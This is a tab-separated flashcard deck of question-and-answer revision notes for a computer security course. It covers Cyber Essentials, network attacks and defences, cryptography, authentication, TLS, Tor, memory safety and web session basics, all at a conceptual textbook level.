Topic	Question	Answer
Security Basics	Name and define CIA:	1. Confidentiality: Ensures that computer related assets are accessed only by authorized parties. \n2. Integrity: Assets can be modified only by authorized parties or only in authorized ways. \n3. Availability: Assets are accessible to authorized parties at appropiate times.
Security Basics	Name the tools that enforce CIA:	1. Confidentiality: Encryption, Access control, Authentication, Authorization, Physical security. \n2. Integrity: Backups, Checksums, Data correcting codes. \n3. Availability: Physical protections, Computational redundancies.
Security Basics	Briefly describe all 5 of the security properties:	1. Confidentiality: No improper information gathering. \n2. Integrity: Data has not been (maliciously) altered. \n3. Availability: Data/services can be accessed as desired. \n4. Accountability: Actions are traceable to those responsible. \n5. Authentication: User or data origin are accurately identifiable
Security Basics	Name the 10 Steps to Cyber Security:	1. Defining and communicating Risk Management Regime. \n2. Network Security. \n3. Malware Protection. \n4. Monitoring. \n5. Incident Management. \n6. Managing User Priviledges. \n7. Removable Media Controls. \n8. Secure Configuration. \n9. Home and Mobile Working. \n10. User Education and Awareness.
Cyber Essentials	Name the 5 Cyber Security Essentials:	1. Secure configuration. \n2. Boundary firewalls and internet gateways. \n3. Access control and administrative privilege management. \n4. Patch management. \n5. Malware protection.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#1 Secure Configuration:	Want to reduce the level of inherent vulnerabilities in computers and network devices, and have them provide only the services required to fulfil their role. Mainly because default settings are not necessarily secure and predefined passwords tend to be widely known.
Cyber Essentials	State the 5 steps to achieve CSE#1 Secure Configuration:	1. Remove or disable unnecessary user accounts. \n2. Remove or disable unnecessary software. \n3. Remove or disable the auto-run feature. \n4. Change default passwords for user accounts to a strong password. \n5. Enable a personal firewall (or equivalent) on desktop PCs and laptops, and configure it to disable (block) unapproved connections by default.
Cyber Essentials	What constitutes a strong password?	Typically one that has a minimum number of characters in length (e.g. eight characters); differs from the associated username; contains no more than two identical characters in a row; is not a dictionary word; includes a mixture of numeric and alpha characters; has not been reused within a predetermined period of time (e.g. six months); and has not been used for another account.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#2 Boundary firewalls and internet gateways:	Want to protect information, applications and computers within the organization's internal networks against unauthorized access and disclosure from the internet, using boundary firewalls, internet gateways or equivalent network devices. \nBoundary devices are the first line of defense; firewall rules can be used to stop basic attacks before they even reach the internal network.
Cyber Essentials	State the 4 steps to achieve CSE#2 Boundary firewalls and internet gateways:	1. Change default administrator passwords for all network devices and firewalls. \n2. Have each rule that allows network traffic to pass through the firewall be approved by an authorized individual and documented. \n3. Disable (block) unapproved services, or services that are typically vulnerable to attack by default using boundary firewalls. \n4. Remove or disable in a timely manner firewall rules that are no longer required.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#3 Access control and administrative privilege management:	Want to manage effectively and provide the minimum level of access to applications, computers and networks by assigning user accounts, particularly those with special access privileges to authorized individuals.
Cyber Essentials	What is the principle of least priviledge?	Only give users access they need; admin accounts have the most access, if one gets compromised it can lead to large scale loss of information.
Cyber Essentials	State the 7 steps to achieve CSE#3 Access control and administrative privilege management:	1. Subject all user account creation to a provisioning and approval process. \n2. Restrict special access privileges to a limited number of authorized individuals. \n3. Document details about special access privileges, keep them in a secure location and review them on a regular basis. \n4. Use admin accounts only to perform legitimate admin activities, and do not grant them access to email or the internet. \n5. Configure admin accounts to require a password change on a regular basis. \n6. Have each user be authenticated using a unique username and strong password before being granted access to applications, computers and network devices. \n7. Remove or disable user accounts and special access privileges when no longer required or after a pre-defined period of inactivity.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#4 Patch management:	Want to keep software running on computers and network devices up-to-date and have the latest security patches installed. \nVulnerabilities in software are patched through updates; if you don't install the update, the vulnerability is not patched; patching can cause compatibility problems, thus you should always test the patches.
Cyber Essentials	State the 4 steps to achieve CSE#4 Patch management:	1. License and support software running on computers and network devices on the internet to ensure security patches for known vulnerabilities are made available. \n2. Install updates to software running on computers and network devices in a timely manner. \n3. Remove out-of-date software. \n4. Install all security patches for software in a timely manner.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#5 Malware protection:	Want to protect computers exposed to the internet against malware infection through the use of malware protection software. \nTodays firewalls are very good, most malicious software must be invited in by a user opening an email, browsing a compromised website, or connecting compromised media; protection software continuously monitors the computer for known malicious programs.
Cyber Essentials	State the 5 steps to achieve CSE#5 Malware protection:	1. Install anti-malware software on all computers that are connected to or capable of connecting to the internet. \n2. Update anti-malware software on all computers. \n3. Configure anti-malware software to scan files automatically upon access and scan web pages when being accessed. \n4. Regularly scan all files. \n5. Ensure anti-malware software prevents connections to malicious websites on the internet.
Cyber Essentials	How can an institution/person receive the Cyber Essentials Certification?	Through first a self-assessment questionnaire, followed by an external vulnerability scan by an approved tester. The scan comprises of: \n1. External full TCP port and UDP service scan for stated IP range. \n2. Vulnerability scan for stated IP range. \n3. Basic web app scanning for common vulnerabilities.
Cyber Essentials	How can an institution/person receive the Cyber Essentials Certification Plus?	Once the Cyber Essentials Certification has been granted, an internal vulnerability scan and on-site assessment can be carried out by an approved tester. The scan comprises: \n1. Inbound email binaries and payloads. \n2. Inbound emails containing URLs linking to binaries and browser exploitation payloads. \n3. Authenticated vulnerability and patch verification scan.
Network and Internet vulnerabilities	Write down the structure of a URL, and give an example:	Figure 1
Network and Internet vulnerabilities	Describe briefly how routing works:	Your computer connects to the cloud, and the cloud to a webserver. In the cloud, there are multiple points prior to reaching the final path, such as multiple internet service providers, your modem, etc.
Network and Internet vulnerabilities	How do IP addresses work?	Every computer on a network has an IP address which is unique from the other computers. Each interface on a computer gets one IP address (WiFi gets one IP, wired gets another if both are connected). IP address changes every time the computer changes networks (Inside the University only the last few bits will normally change, but if you go home the whole address may change.)
Network and Internet vulnerabilities	How are IP addresses represented?	Figure 2
Network and Internet vulnerabilities	Explain what an autonomous system is and give a real example of one:	An Autonomous System is a single organisation which is in charge of routing for a set of IP addresses. The organisation in charge of rerouting of the network paths when Syria turned off the internet is an AS.
Network and Internet vulnerabilities	Explain what a Domain Name System (DNS) is and how they work:	DNS services translate URLs to their IP addresses (http://lemac.com -> 69.163.145.230). Mappings between URLs and IPs are not static and DNS service keep track of those. One domain, such as google.com, may have multiple IP addresses associated, as several computers are used for hosting that domain. DNS servers are best targets for attackers, since if the mappings are taken down the asociated websites go offline.
Network and Internet vulnerabilities	What can a Man in the Middle do, and who tend to be MMs?	Man in the Middle entities can view, change, add and delete traffic. They could be an ISP, VPN provider, Wifi provider, an attacker re-routing the connection, or an incompetent admin.
Network and Internet vulnerabilities	What are the types of Network Security Threats, and what security properties do they affect?	1. Interception: Unauthorized viewing of information. Affects Confidentiality. \n2. Modification: Unauthorized changing of information. Affects Integrity. \n3. Fabrication: Unauthorized creation of information. Affects Integrity. \n4. Interruption: Preventing authorized access. Affects Availability.
Network Protections	Which properties does Encryption guarantee and which doesn't it?	Applied to data, it guarantees confidentiality and integrity of the data, but not availability. Authentication and accountability are sometimes guaranteed and sometimes not, depending on how encryption is setup
Network Protections	Describe what a VPN is:	Some resources can only be accessed when your computer is connected to the interior of a private network, VPN makes it so your computer can be at home, but behave like it was directly connected to University network. Your computer sends some data, the VPN client on your computer wraps it in some encryption and sends the bigger message to the vpn host, the host decrypts it and drops it on the network just like it originated there.
Network Protections	What properties do VPNs provide?	Authentication and some Accountability, since all connections to the VPN server are authenticated, random people cannot connect. Confidentiality and Integrity between client and VPN host, since VPN connections are encrypted, so it doesn’t matter where the client is, their data will be safe in transit. \nAvailability is not guaranteed; and they are actually intentional Man-in-the-Middle attacks, a VPN server can read and alter any non-encrypted traffic flowing over it.
Network Protections	What is a Denial of Service (DoS) attack and which ones are the most common?	Attacks that prevent valid users from accessing a service. It can be commonly done by cutting power, cables; overloading a server with invalid traffic or removing a user account. However, more technical attacks include SYN flooding, Spoofing and Smurfing.
Network Protections	Explain how SYN Flooding works:	In a nutshell: send tons of requests at the victim and overload them. Alice sends many SYN packets, without acknowledging any replies. Bob accumulates more SYN packets than he can handle. More in Figure 3.
Network Protections	What are the problems and limitations of SYN flooding?	Attribution: attacker​ uses own ​ IP​ which ​ could be traced; and Bandwidth: attacker​ users own bandwidth​ which is likely ​smaller than a servers. \nIt is effective against a small target, such as someone running a game server in their home; and ineffective against a large target, such as a company website.
Network Protections	Describe Spoofing, and state its advantages and problems:	Same as SYN flooding, but forge the source of TCP packet. \nIts advantages are: harder to trace, and ACKs are sent to a second computer, less atacker bandwidth used. Its problem is that Ingress filtering is commonly used to drop packets with source addresses outside their origin network fragment. (ingress filtering is a technique ensuring incoming packets are actually from the networks from which they claim to originate).
Network Protections	Explain how Smurfing works:	Smurfing attack exploits the ICMP (Internet Control Message Protocol) whereby remote hosts respond to echo packets to say they are alive (ping). Some implementations respond to pings to broadcast addresses. \nThe idea is to Ping a LAN to find hosts, which then all respond to the ping. The attack consists in making a packet with a forged source address, containing the victim’s IP number. Send it to a smurf amplifier, who swamp the target with replies. Lans that allow Smurf attacks are badly configured, in which case one of the of the options is to blacklist these LANs.
Network Protections	Describe the Distributed Denial of Service (DDoS) attack and give some examples:	A DDoS attack occurs when a large number of machines work together to perform an attack that prevents valid users from service access. It raises the Slashdot effect, when a large number of valid users all try and access at once. Examples include botnets, or AWS.
Network Defenses	Draw the Open System Interconnect (OSI) model's graph, including the data/layers and header information.	Figure 4.
Network Defenses	What are Firewalls?	They are a set of rules allowing or denying traffic with the purpose of dividing the untrusted outside of a network from the more trusted interior of a network. Additionally, they can act as routers deciding where to send traffic.
Network Defenses	What differs between the types of Firewalls?:	At the implementation level: in software it's slower and easier to deploy on personal computers; and in hardware it's faster, somewhat safer but harder to add in. \nAt the number of OSI levels of processing required: Packet size (lvl1); MAC (lvl2) and IP (lvl3) filtering; Port filtering (lvl3); and Deep packet (lvl4+)
Network Defenses	How does a packet filtering gateway (or screening router) work?	It compares information found in the headers to policy rules, operating at OSI level 3. Source addresses and ports can be forged, which a packet filter cannot detect. Design is simple, but tons of rules are needed, so it is challenging to maintain.
Network Defenses	How does Stateful inspection firewall work? Give an example	Maintains state from one packet to another. Similar to a packet filtering gateway, but can remember recent events. \nExample - If outside host starts sending packets to many internal destination ports (aka port scan), a stateful firewall would record the number of ports probed and once it is over the threshold specified in the policy it would block all further traffic.
Network Defenses	How does an application proxy work? Give an example	Simulates the (proper) effects of an application at OSI level 7. Effectively a protective Man In The Middle that screens information at an application layer (OSI 7). Allows an administrator to block certain application requests. \nExample: \nBlock all web traffic containing certain words; \nRemove all macros from Microsoft Word files in email; \nPrevent anything that looks like a credit card number from leaving a database
Network Defenses	How do Personal firewalls work?	Runs on the workstation that it protects (software). Provides basic protection, especially for home or mobile devices. Malicious software can disable part or all of the firewall. Any rootkit type software can disable the firewall.
Network Defenses	What is the address space exhaustion in IPv4, and how does Network Address Translation (NAT) overcome it?	Less than 4.3 billion IPv4 addresses available, not enough addresses for every device on the planet. NAT solves it by having internal IP different than external IP; border router maps between its own IP and the internal ones. Additionally a single device can have multiple IPs as well, if there are multiple internet interfaces.
Network Defenses	Why do we need Intrusion detection systems (IDS)?	Because a user may let something into the network that is malicious, by being an insider threat themselves. These incidents cannot be prevented or anticipated in advance so the logical next step is to identify something bad is happening quickly, so you can address it.
Network Defenses	How do Signature based IDS work?	Perform simple pattern matching and report; Requires that admin anticipate attack; Attacker may test attack on common System; Impossible to detect a new type of attack; High accuracy, low false positives;
Network Defenses	How do Heuristic based IDS work?	Dynamically build a model of acceptable or normal behavior and flag anything that does situations that match the pattern not match; Does not need to anticipate potential patterns in advance attacks; Needs time to warm up to new signatures behavior; Can detect new types of attacks; Higher false positives, lower accuracy
Network Defenses	What is the problem with having a large number of alarms?	Too many alarms going off make it hard to investigate all of them in great depth; Some cyberattack insurance policies state that if you know about an attack and do nothing they will not cover the attack. Having a noisy IDS can potentially be a liability
Network Defenses	What are the two main encryption properties we want?	1. The ​ communication​ between you and the other party is ​confidential​ and has not been changed (Confidentiality & Integrity - cryptography is able to ensure these requirements are met). This way no one can read what you sent; No one can change what you sent. \n2. Knowing who​ you are communicating with (Difficult - cryptography is able to verify that you are speaking with same person, but not the identity). Verifying you are talking to who you think you are talking to and not someone else
Public key Cryptography	What is the idea behind public key cryptography?	Generate two keys that are paired, whatever one key locks only the other key can unlock. Public keys are given out to everybody, private keys are kept private.
Public key Cryptography	How does Alice send Bob a message only he can read, and prove it was her who sent it?	To send Bob a message only he can read, Alice encrypts the message with Bob's public key, since only Bob has his private key only he can decrypt the message. \nTo prove the message was hers, she can encrypt the message with her private key, then if Bob successfully decrypts the message with her public key, he will have verified it was Alice who sent the message.
Public key Cryptography	What are the three main ideas to keep track of which key goes with which person, and what are the limitations with the first two?	1. Have humans doing the linking of identity to cryptogtraphic keys. Problem is the chicken and egg problem for finding a guaranteed place to be from us without using cryptography. \n2. Develop a Web of trust by having everyone do a few verifications. Problem is that verifying long keys is hard and human error is high, thus creating a lack of trust. \n3. Having a couple of trusted groups that do the verifications. They would have high standards and everyone would trust them.
Public key Cryptography	How could humans do the linking of cryptographic keys to identities?	Posting public key somewhere public and verify it came from us (Such as Adobe Product Security Incident Response Team (PSIRT)) where other people can compare keys on their computers to a highly visible copy.
Public key Cryptography	How would the Web of trust work?	Alice hand verifies that Bobs public key really does belong to Bob (super long key). Alice signs the key by encrypting it with her private key. Anyone who has hand verified Alices key, can also trust Bobs key (if they trust Alice to do verifications)
Public key Cryptography	What are Certificate Authorities?	Certificate authorities verify the properties of a person/organization and issues a certificate signed by their private key. Certificates can be quite detailed about what has been verified and what they have been verified to do.
Public key Cryptography	Where are Certificate Authorities used?	Certificate Authorities are used by browsers to verify identity. Some sites are using untrusted certificate authorities (Uni creating own CA, using it to sign sites keys, as it costs money to get signed certificate). Operating system and browsers maintain lists of trusted CA, which vary by OSs, browsers, organisations
Usable Security and User Training	What are first and third party websites?	First are the ones you intentionally visit, third are the ones which the first party instructs to gather additional content from (ads, images, calendars, Facebook, etc).
Usable Security and User Training	How much do people account for security incidents, and why don't they use security or privacy technologies?	They account for 90%. They don't because: \n1. They don’t care about security and privacy. \n2. They don’t know about security and privacy issues. \n3. They cannot use security and privacy technologies
Usable Security and User Training	What are the 7 things to do to be safe online?	1. Install anti-virus scanner. \n2. Keep software updated. \n3. Select strong passwords. \n4. Use password manager. \n5. Use ad blocker. \n6. Remove unused software. \n7. When unsure about a website, Google for it
Usable Security and User Training	Lay out a possible cognitive walkthrough testing usability. Why do we need it?:	1. Will users try to achieve the outcome of our action? \n2. Will users see the trigger for the action? \n3. Once the trigger is found, will users recognise that an action will produce wanted effect? \n4. After the action, will the users understand the feedback? \nSecurity experts are not trained for usability, and Usability experts leave out important security steps (like key verification)
Usable Security and User Training	How do passwords work? Explain why they are so convenient, and what are the main problems with them:	A character string (password) is agreed upon between the user and the system, user proves their identity by providing the password. \n They are convenient because they are easy to store; encrypted; easy to enter on many systems; no special equipment needed; and it scales well. \n The main problem is that people choose easy to guess passwords. Passwords with low entropy are easy to guess, and those with high entropy are hard to remember.
Usable Security and User Training	What is the UK guidance on simplifying passwords?	1. Change all default passwords. \n2. Help users cope with password overload. \n3. Understand the limitations of user-generated passwords. \n4. Understand the limitations of machine generated passwords. \n5. Prioritize administrator and remote user accounts. \n6. Use account lockout and protective monitoring. \n7. Don’t store passwords as plain text.
Usable Security and User Training	Why are user-generated passwords less secure than machine-generated passwords?	User-generated passwords tend to be low entropy; have facts about themselves such as their pet’s name; are guessable by someone who knows them; and are easy to lookup in a password dictionary. \nMachine-generated passwords, on the other hand, select passwords that are challenging for other computers to guess, often produce passwords that are pronounceable or made up of words, and lets users choose from various options.
Usable Security and User Training	Explain the concept of phishing and give some examples:	Phishing is attempting to trick someone into taking the “bait” and interacting in a way they should not. It typically involves the impersonator pretending to be someone else that the person trusts. Examples include: clicking a link, opening a file, replying with information, transferring money, etc.
Usable Security and User Training	What are the different types of phishing?	The different types are: \n1. Spear phishing: phishing, but with a small number of targets and each email is crafted for that individual. \n2. Whaling: phishing for people with a lot of money, i.e. CEO. \n3. QRishing: phishing attacks through QR codes
Usable Security and User Training	How can you prevent phishing email interaction?	Scan all incoming attachments and links for blacklisted content and teach users to: only click if you are expecting the email; do not open attachments unless you are expecting them; if you are not sure, contact the person or company separately and ask if they sent the email; if you are not sure, contact the IT department; banks and credit card companies will never contact you this way.
Usable Security and User Training	Why do people click through warnings?	The site is used often and trusted; the person who posted the link is trusted; the site where the link is assumed to have good security; they think they are safe
Usable Security and User Training	What are the concepts of NEAT and SPRUCE?	They are guidance as to how to create effective security messaging for end users. Created by Microsoft Research.
Usable Security and User Training	Explain the concept of NEAT:	N​ecessary: Can you change the architecture to eliminate or defer this user decision? \nE​xplained: Does your user experience present all the information the user needs to make this decision? (See SPRUCE) \nActionable: Have you determined a set of steps the user will realistically be able to take to make the correct decision? \nT​ested: Have you checked that your user experience is NEAT for all scenarios, both benign and malicious? Have you tested it on a human who is not a member of your team?
Usable Security and User Training	Explain the concept of SPRUCE:	S​ource: State who or what is asking the user to make a decision. \nP​rocess: Give the user actionable steps to follow to make a good decision \nR​isk: Explain what bad thing could happen if the user makes the wrong decision \nU​nique knowledge the user has: Tell the user what information they bring to the decision \nC​hoices: List available options and clearly recommend one \nE​vidence: Highlight information the user should factor in or exclude in making a decision
Authentication	What is Authentication and when should it happen?	Verifying a fact about an entity before allowing it to perform an action. \nIt should happen every time an action is taken and there is no way to be certain that the authenticated entity has not changed. In practise, when logging into website, it looks like you authenticate once; however the computer is actually authenticating for you every time, talking to the server to prevent session hijacking.
Authentication	What 4 things are you authenticating?	The identity of a person; that they are same entity as who setup the account; that they have specific properties (E.g. above legal drinking age, student at uni, Facebook user); that another authenticator thinks they are same entity.
Authentication	What can authentication factors be?	1. Something you ​ know (can forget) ​ (pass, mothers maiden name, your address). \n2. Something you ​ have (can loose) ​ (student ID card, credit card chip, RSA key). \n3. Something you ​ are (can’t change) ​ (finger prints, voice tones, iris, typing patterns).
Authentication	Give examples of multi-factor authentication:	Two factor: \nChip & pin in credit card. Something you have (chip), Something you know (pin). \nChip & signature credit card. Something you have (chip), Something you are (signature pattern). \nThree factor: \nSecurity guard that checks your ID agains how you look and then requires a code. \nFinger print reading fob that gives a code after reading a print and then using code together with password to login
Authentication	Give an example of invisible continuing authentication:	Log into website using password (something you know); website sets a cookie with a secret and a timestamp; every time you visit a new page, your computer sends the cookie (something you have) and server verifies it; when you log out, the cookie is destroyed
Authentication	How do banks do invisible 2-factor authentication?	Login to website using pass (something you know); website also is sent cookie from last time login (something you have); if pass and cookie match, you log in; if cookie is missing/wrong, something you have is proven by calling (phone) or emailing code (email)
Authentication	What are the 2 ways to protect a password on a server?	1. Encrypt the password and keep the key in safe place. \n2. Hash the password. Hashing doesn’t require secret key, thus there is nothing to loose
Authentication	"Give 5 examples of ""something you have"" that can authenticate you:"	1. Physical keys (like, well, real keys) - single factor authentication. \n2. RSA key fob (prints out number on button press, number is typed along with pass) - two factor auth. \n3. Chip in credit card - similar to RSA fob. \n4. Public/Private digital key - public unlocks what private locks and vice versa. PGP key is something you have which authenticates you. \n5. DKIM - people aren’t the only ones authenticating, servers do that too. DKIM email signature is used for that (preventing Spam)
Authentication	"Give 3 examples of ""something you are"" that can authenticate you:"	1. Fingerprint readers (and other biometrics): nearly unique; not all people have them; can’t be changed; are left everywhere. \n2. Continuous authentication: mouse and Keyboard usage patterns; nearly unique; easy to loose in case of injury; RSI patients issues. \n3. Privacy: users have the right to privacy & keeping unnecesary info of themselves hidden; authentication mechanisms need to not ask for more data than they need; identification via FB, Google, Apple acc is easy, but gives away a lot of data; requiring validated ID (drivers/passport info) exposes a lot of info.
SSL/TLS	What is SSL/TLS?	Protocol with the goal of providing Confidentiality and Integrity. Uses X.509​ certificates and ​ asymmetric cryptography​ to ​ exchange​ a ​ symmetric​ ​ key. Session key​ is used to ​ encrypt subsequent communication providing Data/Message confidentiality, message integrity and authentication.
SSL/TLS	Where does SSL/TLS operate, and how?	It operates above the transport layer using TCP. It proceeds with a handshake protocol in the following manner: Client Hello -> Server hello + Certificate -> Client Key exchange -> Server Change cipher spec
SSL/TLS	Why is SSL/TLS renegotiation needed and what are its weaknesses?	1. Refresh the keys. \n2. Increase authentication. \n3. Increase cipher strength. \nClient or server can trigger renegotiation by sending a hello message. Its weaknesses are that: \n1. Renegotiation has priority over application data. \n2. Can take place in the middle of an application layer transaction. \n3. Client ​DOESN’T CHANGE through renegotiation.
SSL/TLS	How does SAML (Security Assertion Markup Language) SSO (Single Sign On) work?	See Figure 6
SSL/TLS	How does Google implement SAML SSO?	Google’s SAML-based SSO for Google Applications deviates from the above protocol for a few, seemingly minor simplifications in the messages exchanged: \n1. ID and SP are not included in the authentication assertion, i.e. AA = AuthAssert(C; IdP) instead of AuthAssert(ID; C; IdP; SP); \n2. ID, SP and IdP are not included in the response, i.e. Resp = Response({AA}K^−1_{IdP}) instead of Response(ID; SP; IdP; {AA}K^−1_{IdP}).
Anonimity Protocols	Why do we need protocols for anonymity?	Because: \n1. Internet is a public network and network routers see all traffic passing through them. \n2. Routing information is public and IP packet headers contain source and destination of packets. \n3. Encryption doesn’t hide indentities, what it does it hides payload, but not the routing information.
Anonimity Protocols	What is anonymity and how can we achieve it? What kinds of protocols for that are there?	Using a service or resource without disclosing ones identity. This can be achieved by hiding one’s activities among other similar activities. \nDinning cryptographers; Crowds; Chaum’s mix; Onion routing
Anonimity Protocols	What is the setting for the Three-party dining cryptographers (3DC) protocol?	Three cryptographers are having dinner. Either NSA paid for the dinner, or one of the cryptographers. They want to know if it is the NSA that paid, but without revealing the identity of the cryptographer that paid in the case the NSA did not pay.
Anonimity Protocols	How does the 3DC protocol work? What are the limitations?	Each cryptographer flips a coin and shows it to the left neighbour. (Each of them will see their own coin and the coin of a right neighbour). Each cryptographer announces whether the two coins he saw are the same. If he is the payer, he lies. Odd number of “same” => NSA paid, Even number of same=> one of cryptographers paid. \nIt is impractical because it requires pair-wise shared secret keys (secure channels) between participants (share random bits); and large amounts of randomness.
Anonimity Protocols	What is the idea of the superposed sending in the 3DC protocol?	3DC protocol generalises to any group size n (nDC). Sender wants to anonymously broadcast a message m:\n1. For each bit of m, every user generates a random bit and sends it to left neighbour. Every user learns two bits - his own, and his right neighbours. \n2. Each user (except the sender) announces Own_bit XOR Neighbour_bit. \n3. Sender announces Own_bit XOR Neighbour_bit XOR message_bit. \n4. XOR of all announcements = message_bit. Every randomly generated bit occurs in the sum twice and is cancelled by XOR. Message_bit occurs only once.
Anonimity Protocols	What is the idea behind the Crowds protocol and how does it work? What is the problem with it?	Randomly route the request through crowd of users. A crowd is a group of m users; c out of m users may be corrupted. \nInitiator wanting to request a webpage creates a path between him and the server. Initiator selects forwarder from the crowd and sends him his request. Forwarder delivers request to server with probability of 1-Pf; He forwards the request to a randomly selected new forwarder from the crowd with probability Pf; New forwarder repeats the procedure. Response from server follows the same route in opposite direction. \nThe problem is that it is not resistant against an attacker that sees the whole network traffic.
Anonimity Protocols	How does Chaum's mix work and what are the limitations?	The mixes generate dummy messages to prevent an attacker sending n-1 messages to a mix with capacity n, allowing to then link sender of n’th message with recipient. Additionally, uses message padding and buffering to avoid time correlation attacks and have return addresses be anonymous. \nAsymmetric encryption, Dummy messages and Buffering are all innefficient.
Anonimity Protocols	What is the idea behind Onion Routing and what is its main problem?	Combine advantages of mixes and proxies, by using public-key crypto only to establish circuit, use symmetric-key crypto to exchange data and distribute trust like mixes. \nThe problem is that it does not defend against attackers that control the whole network.
Anonimity Protocols	Draw the TOR circuit setup and describe how the client connects to the server:	See Figure 7. \n1. Client establishes session key K1​ and circuit with Onion Router​ R1. \n2. Client tunnels through that circuit to extend to Onion Router ​R6. \n3. Client tunnels through that extended circuit to extend to Onion Router ​R4. \n4. Client applications connect and communicate through the established TOR circuit.
Anonimity Protocols	What security properties does TOR provide? What are its limitations?	TOR only provides privacy, not confidentiality. It anonymises the origin of the traffic and encrypts everything inside the TOR network. TOR ​DOES NOT​ encrypt all traffic through the Internet. For confidentiality, end-to-end encryption, such as SSL/TLS, still has to be used. \nTOR ​DOES NOT provide protection against end-to-end timing attacks. If attacker can see both ends of communication channel, he can correlate volume and timing information on these two sides.
Anonimity Protocols	How does TOR take care of DNS resolution and avoids censorship?	TOR only anonymises TCP streams. DNS resolution, if handled by the client browser, defeats the purpose of using TOR. To avoid privacy breaches due to DNS resolution, TOR browser delegates DNS resolution to the exit node over UDP. \nTOR relays are listed on public TOR directory. Your Local ISP can observe you communicating with TOR nodes. ISPs and governments can try to block access to the TOR network by blocking TOR relays. TOR bridge relays are relays not listed on the public TOR directory. Entering TOR network through TOR bridge relay can prevent ISPs and governments from blocking access to TOR network.
Memory Safety	What does Linux (32-bit) process memory layout look like?	See Figure 9.
Memory Safety	What can a buffer overflow do?	Load malicious code into memory and make %eip point to it
Memory Safety	What are the main three functions in a stack, and what do they do?	Caling function: \n1. Push arguments onto the stack (in reverse) \n2. Push the return address (I.E. the address of the instruction to run after control returns) \n3. Jump to the function’s address \n\nCalled function: \n1. Push the old frame pointer onto the stack (%ebp) \n2. Set frame pointer (%ebp) to where the end of the stack is right now (%esp) \n3. Push local variable onto the stack \n\nReturning function: \n1. Reset previous stack frame: %esp = %ebp, %ebp = (%ebp) \n2. Jump back to return address: %eip = 4(%esp)
Memory Safety	What is the shellcode injection's goal, and how does it work?	The goal is to ​ “spawn a shell”, which will give the attacker general access to the system. In order to do so: \nMust inject the machine code instructions (code ready to run); Code can’t contain zero bytes (printf, gets, strcpy will stop copying); Can’t use the loader (we’re injecting)
Memory Safety	What are the challenges of shellcode injection?	The main challenge is to find the address of the injected malicious code. If code accessible: we know how far is the overflowed variable from saved %ebp. If code not accessible: try different possibilities, as in 32 bits memory space there are 2^32 possibilities. It makes use of a NOP sled: Guess approximate stack state when the function is called and insert many NOPs before Shell Code
Memory Safety	What kinds of unsafe libc functions are there?	Unsafe functions do not check bounds of buffers they manipulate. Some examples include: strcpy (char *dest, const char *src); strcat (char *dest, const char *src); gets (char *s); scanf (const char *format, ...)
Memory Safety	How does an integer overflow happen?	It occurs when the system attempts to store a value in an integer which is greater than the maximum value integer can hold resulting in the value being trunctated.
Memory Safety	How do format string vulnerabilities arise?	The format function retrieves the parameters requested by the format string from the stack, the vulnerability arises when the attacker is able to provide the format string to the format function
Memory Safety	What are stack canaries?	They detect a stack buffer overflow before execution of malicious code. They do it by placing a small integer before the stack return pointer. To overwrite return pointer the canary value must also be overwritten. Canary is checked to make sure it has not changed before a routine uses return pointer on the stack.
Memory Safety	What kinds of stack canaries are there?	1. Terminator canaries (CR, LF, NUL (i.e., 0), -1): scanf etc. do not allow these values. \n2. Random canaries: Write a new random value at each process start and save real value somewhere in memory. Must write-protect stored value. \n3. Random XOR canaries: Similar as random canaries but they store canary XOR some control info, instead.
Memory Safety	Why would we want to make stack and heap non executable? What problem is there with that?	Because then even if the canary is bypassed, malicious code loaded cannot be executed.\nThe problem is that it makes the system vulnerable to return-to-libc attack: libc library is linked to most C programs and provides useful calls for an attacker.
Memory Safety	How does Addess space layout randomization work?	The idea of ASLR is to place standard libraries to random locations in memory. (For each program, exec() is situated at different location). It results in the attacker not being able to directly point to exec(). It is supported by most OS.
Web Security: Basics	Explain the different parts of a URL from the point of view of Web Security:	E.g. Protocol://host/FilePath?arg1=val1&arg2=val2 \nProtocol: protocol to access the resource (http, https, ftp, etc.) \nHost: name or IP address of the computer resource is on \nFilePath: path to the resource on the host \nResources can be static (file.html) or dynamic (do.php) \nURLs for dynamic content usually include arguments to pass to the process (arg1, arg2)
Web Security: Basics	What are the possible HTTP requests? What does an HTTP response contain?	GET, POST, PUT, etc. \nA response contains a Status-line, e.g. HTTP/1.1 200 OK; zero or more header(General|Response|Entity) fields followed by CRLF; an empty line (i.e., a line with nothing preceding the CRLF) indicating the end of the header fields; optionally a message-body
Web Security: Basics	How is state managed in HTTP sessions? Is there any problem with that?	HTTP is stateless: when client sends a request, server sends back a response, but server does not hold any information on previous requests. The problem with that is that​ in most web applications a client has to access various pages before completing a specific task and the client state should be kept along all those pages.
Web Security: Basics	How does the server know if two requests come from the same browser?	The server inserts some token into the page when it is requested and gets that token passed back with the next request. For this there are two main approaches​ (to maintain session between web client and web server): Using hidden fields; and using cookies
Web Security: Basics	How do Hidden fields work? What are their advantages and disadvantages?	The idea is to include an HTML form with hidden fields containing session ID in all HTML pages sent to client. The hidden fields will be returned back to server in the request. For example,​ the web server can send a hidden HTML form field along with a unique session ID as follows: When the form is submitted, the specified name and value are automatically included in the GET or POST data. \nTheir advantage is that all browsers support HTML forms. Their disadvantages are that it requires careful and tedious programming effort, as pages behave to be dynamically generated to include this hidden field; and the session ends as soon as the browser is closed.
Web Security: Basics	How do Cookies work? What are they used for and what is their problem?	A cookie is a small piece of information that server sends to browser and gets stored inside the browser. It has a name, a value and other attributes such as domain, path, expiration date, version, comments. Browsers automatically include cookies in all subsequent requests to originating host of the cookie. Cookies are only sent back by browser to their originating host and not any other hosts. Domain and path specify server and path to return the cookie. Server can set cookie value to uniquely identify a client. \nCookies are commonly used for session and user management, as well as to hold personalised information, or to help in online sales/service (e.g. shopping cart). \nTheir main problem is that users may disable cookies in their browser.
Web Security: Basics	What are the security goals, and defences employed, in web security?	Web applications should provide the same security guarantees as those required for standalone applications. \n1. Visiting malicious website should not infect computer with malware or read and write files \nDefences: ​ Javascript sandboxed, aviod bugs in browser code, privilege separation, etc. \n2. Visiting malicious website (evil.com) should not compromise my session on other websites (gmail.com). Defences:​ same-origin policy - each website is isolated from all other websites. \nSensitive data stored on websites (gmail.com) should be protected.
Web Security: Basics	What are the kinds of web security attackers?	There are two kinds: \nWeb attacker: Controls malicious website (evil.com); has valid SSL/TLS certificates for evil.com; victim user visits evil.com (weaker). \nNetwork attacker: Controls the whole network; can intercept, craft, send messages (stronger).
